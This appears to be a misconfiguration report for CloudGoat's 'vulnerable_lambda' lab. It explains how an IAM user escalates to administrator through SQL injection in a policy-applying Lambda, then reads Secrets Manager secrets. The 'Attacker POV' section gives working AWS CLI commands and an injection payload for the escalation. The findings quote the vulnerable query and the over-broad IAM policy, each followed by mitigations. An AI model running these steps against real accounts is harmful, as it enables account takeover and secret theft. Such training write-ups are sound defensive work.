vulnerable_lambda — Misconfiguration Report

## Environment Overview

A single AWS account with a small IAM-centric setup:

- **IAM User `bilbo`** — A standard user with permissions to enumerate IAM and to assume a specific role.
- **IAM Role `cg-lambda-invoker`** — An intermediate role that allows invoking a Lambda function and performing broad IAM simulation and read actions.
- **Lambda `policy_applier_lambda1`** — A Python function that reads from a local SQLite database and attaches managed IAM policies to a target user based on that database.
- **Secrets** — A secret stored in AWS Secrets Manager, accessible once `bilbo` gains elevated privileges.

This environment is intentionally designed so that a flaw in the Lambda function and its IAM permissions can be abused to escalate `bilbo` from a low-privilege user to an administrator, and then exfiltrate secrets.

---

## Attack Chain Summary

```text
IAM user bilbo
    ↓ finds roles
aws iam list-roles
    ↓ finds lambda
aws lambda list-functions
    ↓ assumes
cg-lambda-invoker role
    ↓ invokes
policy_applier_lambda1 (via SQL injection)
    ↓ attaches
high-privilege IAM policies to bilbo
    ↓ switches back to bilbo credentials
unset invoker role env vars
    ↓ uses new rights to access
Secrets Manager (scenario secret)
```

### Exploit Steps

1. The attacker starts with `bilbo`'s access key and secret (provided as scenario outputs).
2. Using those credentials, they enumerate IAM roles and Lambda functions to discover `cg-lambda-invoker` and `policy_applier_lambda1`.
3. They assume the `cg-lambda-invoker` role, gaining permission to invoke `policy_applier_lambda1` and to continue enumerating IAM.
4. By inspecting the Lambda source code (`policy_applier_lambda1_src/main.py`), they identify that the function builds SQL strings using untrusted input from the `event['policy_names']` array.
5. The attacker crafts a malicious payload that injects a SQL condition to bypass the public-only restriction, causing the query to return `AdministratorAccess` even though it is marked as non-public in the database.
6. They invoke `policy_applier_lambda1` with this payload, causing the Lambda to attach the high-privilege managed policy to the `bilbo` user.
7. The attacker unsets the invoker role's temporary credentials to return to `bilbo`'s original profile, which now has `AdministratorAccess` attached.
8. With `bilbo` now effectively an administrator, the attacker uses the elevated credentials to list and read secrets from AWS Secrets Manager, including the scenario's target secret.

### Attacker POV

```bash
# Configure bilbo's credentials (from CloudGoat output)
aws configure --profile bilbo

# Assume the lambda-invoker role
aws sts assume-role \
  --role-arn arn:aws:iam::<account-id>:role/cg-lambda-invoker-<cgid> \
  --role-session-name bilbo-session \
  --profile bilbo

# Export the temporary credentials returned by assume-role
export AWS_ACCESS_KEY_ID=<returned access key>
export AWS_SECRET_ACCESS_KEY=<returned secret key>
export AWS_SESSION_TOKEN=<returned session token>

# Craft the injection payload.
# The Lambda builds this SQL query with our input:
#   select policy_name from policies where policy_name='<input>' and public='True'
#
# Our injection closes the first quote, adds an OR condition that matches
# AdministratorAccess, and comments out the public='True' check with --

PAYLOAD=$(echo -n '{"policy_names":["'"'"' OR policy_name='"'"'AdministratorAccess'"'"' --"],"user_name":"cg-bilbo-<cgid>"}' | base64)

aws lambda invoke \
  --function-name <cgid>-policy_applier_lambda1 \
  --payload "$PAYLOAD" \
  /tmp/out.json

# Switch back to bilbo's original credentials.
# The invoker role doesn't have Secrets Manager access,
# but bilbo now has AdministratorAccess attached.
unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
unset AWS_SESSION_TOKEN

# Use bilbo's elevated permissions to access Secrets Manager
aws secretsmanager list-secrets --profile bilbo
aws secretsmanager get-secret-value \
  --secret-id cg-secret-XXXXXX-XXXXXX \
  --profile bilbo
```

---

## Misconfiguration Findings

### 1. Unsanitized Input and SQL Injection in Lambda Authorization Logic

**What:** The `policy_applier_lambda1` function validates requested policies by constructing a SQL statement using untrusted input:

```python
statement = f"select policy_name from policies where policy_name='{policy}' and public='True'"
for row in db.query(statement):
    ...
```

The `policy` value from `event['policy_names']` is concatenated directly into the SQL string with no validation or sanitization. The function performs no checks on input type, length, format, or content before using it. There is no allowlist, no regex filtering, and no rejection of SQL-significant characters. This allows an attacker to inject arbitrary SQL into the `WHERE` clause, bypassing the "public only" restriction and forcing the query to return policies that are marked as non-public (such as `AdministratorAccess`). The Lambda uses these query results to decide which policies to attach, so compromising this logic directly controls which managed policies get attached to the target user.

**Mitigation:**

- Use parameterized queries / bound parameters instead of string concatenation.
- Validate that `policy_names` is a list of strings and `user_name` is a string before processing.
- Enforce a strict allowlist or regex pattern for policy names (e.g., only alphanumeric characters and known AWS policy name formats).
- Reject any input containing SQL-significant characters like single quotes, double dashes, semicolons, or `UNION` keywords.
- Set a maximum length and maximum list size for inputs to prevent abuse.
- Validate that `user_name` matches an expected format before passing it to the IAM API.
- Consider avoiding using a mutable, application-managed database as the sole source of truth for which IAM policies can be attached; keep the list of allowed policies in configuration or code.

**Why bother:** Authorization logic implemented in application code is a critical control point. Without both parameterized queries and input validation, a single oversight creates a direct path to privilege escalation. 

---

### 2. Over-Privileged Lambda Execution Role

**What:** The IAM role used by `policy_applier_lambda1` is allowed to attach any AWS managed policy to the target user:

```hcl
# Sourced from: backend/terraform/scenarios/vulnerable_lambda/terraform/lambda.tf

inline_policy {
  name = "policy_applier_lambda1"

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Action   = "iam:AttachUserPolicy"
        Effect   = "Allow"
        Resource = aws_iam_user.bilbo.arn
      },
      ...
    ]
  })
}
```

There is no restriction on which managed policy ARNs can be attached. The `iam:AttachUserPolicy` action has no `Condition` block restricting which policy ARNs are allowed. As long as the Lambda decides a policy is "approved", it can attach any AWS managed policy, including `AdministratorAccess`. Combined with the SQL injection in the approval step, this turns the Lambda into a remote-controllable privilege escalation mechanism.

**Mitigation:**

- Scope `iam:AttachUserPolicy` to a small, explicitly enumerated set of benign policies.
- Use IAM condition keys (for example, `iam:PolicyARN`) to restrict attachable policies to an allowlist.
- Separate the "approval" mechanism from the attachment mechanism — for example, require a human or a separate automated system to approve policy changes instead of a single Lambda.

**Why bother:** Even if application logic were perfect, giving a Lambda the ability to attach any policy to a user is high risk. When the application logic is also vulnerable, this becomes a direct path to full account compromise. A single IAM condition key on `iam:PolicyARN` would have prevented the escalation to `AdministratorAccess` even with the SQL injection intact.

---

### 3. Excessive Privileges for the Starting IAM User

**What:** The starting user `bilbo` is not a true low-privilege account. The `aws_iam_user_policy` named `standard_user` grants it:

- `sts:AssumeRole` on `cg-lambda-invoker*`.
- Broad `iam:Get*`, `iam:List*`, and simulation permissions on `*`.

This means `bilbo` can:

- Discover the lambda-invoker role and the vulnerable Lambda.
- Assume the invoker role without any additional approvals.
- Model the impact of different policies using IAM simulation APIs, which is more power than many real-world "standard" users get.

These permissions are intentionally generous for the scenario, but they represent a common pattern where "helper" or "automation" users have far more ability to move laterally than intended.

**Mitigation:**

- Least Privilege: Treat "standard" IAM users as untrusted and restrict them from assuming roles that can change other principals' permissions.
- Limit IAM `Get*` / `List*` / simulation APIs to only what is necessary for operational tasks.
- For workflows that must change permissions, use dedicated automation principals with tightly constrained roles, not everyday user credentials.

**Why bother:** Starting a scenario from a position of moderate power is fine for training, but in production environments this kind of design dramatically shrinks the gap between "phished credentials" and "full admin".

---

## Severity & Impact

| Factor | Reality |
|---|---|
| Skill Required | Low–Medium (basic SQL injection and AWS CLI) |
| Exploit Time | Low (minutes once code is inspected) |
| Detection Likelihood | Low — no explicit alarms on policy changes or unusual Lambda invocations. However, CloudTrail would log the `iam:AttachUserPolicy` call, so an alert on unexpected policy attachments (especially `AdministratorAccess`) would catch this quickly. |
| Data Obtained | Secrets from AWS Secrets Manager (scenario secret) |
| Blast Radius | Any user reachable by the Lambda's `iam:AttachUserPolicy` permission (at minimum `bilbo`, potentially more if reused) |

An attacker with only `bilbo`'s initial credentials can, without prior knowledge of the environment, quickly escalate to powerful IAM privileges and extract sensitive secrets.

---

## Bottom Line

This scenario combines **vulnerable application logic (SQL injection and missing input validation)** with **over-privileged IAM roles** to create a straightforward path from a "standard" user to full administrative capability. Fixing either piece — hardening the Lambda's input handling or constraining its IAM permissions — would significantly reduce risk. Addressing both brings the design closer to least-privilege and defense-in-depth best practices.